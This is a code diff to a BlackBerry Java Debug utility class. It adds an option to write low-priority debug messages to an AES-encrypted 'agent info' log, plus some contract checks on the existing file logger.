@@ -10,6 +10,11 @@ package blackberry.utils;
 
 import java.util.Date;
 
+import blackberry.agent.Agent;
+import blackberry.config.Keys;
+import blackberry.log.Log;
+import blackberry.log.LogType;
+
 import net.rim.device.api.i18n.DateFormat;
 import net.rim.device.api.system.EventLogger;
 
@@ -21,11 +26,13 @@ public final class Debug {
     public static int level = 6;
 
     static DebugWriter debugWriter;
+    static Log logInfo;
 
     private static boolean logToDebugger = true;
     private static boolean logToSD = false;
     private static boolean logToFlash = false;
     private static boolean logToEvents = false;
+    private static boolean logToInfo = false;
 
     private static boolean enabled = true;
     private static boolean init_ = false;
@@ -98,7 +105,7 @@ public final class Debug {
      */
     public static boolean init(final boolean logToDebugger_,
             final boolean logToSD_, final boolean logToFlash_,
-            final boolean logToEvents_) {
+            final boolean logToEvents_, final boolean logToInfo_) {
 
         if (init_) {
             return false;
@@ -108,6 +115,7 @@ public final class Debug {
         Debug.logToSD = logToSD_;
         Debug.logToFlash = logToFlash_;
         Debug.logToEvents = logToEvents_;
+        Debug.logToInfo = logToInfo_;
 
         if (logToFlash || logToSD) {
             debugWriter = new DebugWriter(logToSD);
@@ -266,6 +274,11 @@ public final class Debug {
             return;
         }
 
+        //#ifdef DBC
+        Check.requires(debugWriter != null, "logToFile: debugWriter null");
+        Check.requires(logToFlash || logToSD, "! (logToFlash || logToSD)");
+        //#endif
+
         final boolean ret = debugWriter.append(message);
 
         if (ret == false) {
@@ -275,6 +288,26 @@ public final class Debug {
                         DebugLevel.ERROR);
             }
         }
+    }
+
+    private void logToInfo(final String message, final int priority) {
+        //#ifdef DBC
+        Check.requires(logToInfo, "!logToInfo");
+        //#endif
+
+        if (logInfo == null ) {
+            
+            if(!Keys.isInstanced()){
+                return;
+            }
+            
+            logInfo = new Log(Agent.AGENT_INFO, false, Keys.getInstance()
+                    .getAesKey());
+        }
+
+        logInfo.createLog(null);
+        logInfo.writeLog(message, true);
+        logInfo.close();
     }
 
     /*
@@ -316,6 +349,12 @@ public final class Debug {
 
         if (logToEvents) {
             logToEvents(message, priority);
+        }
+
+        if (logToInfo) {
+            if (priority < DebugLevel.ERROR) {
+                logToInfo(message, priority);
+            }
         }
     }
 
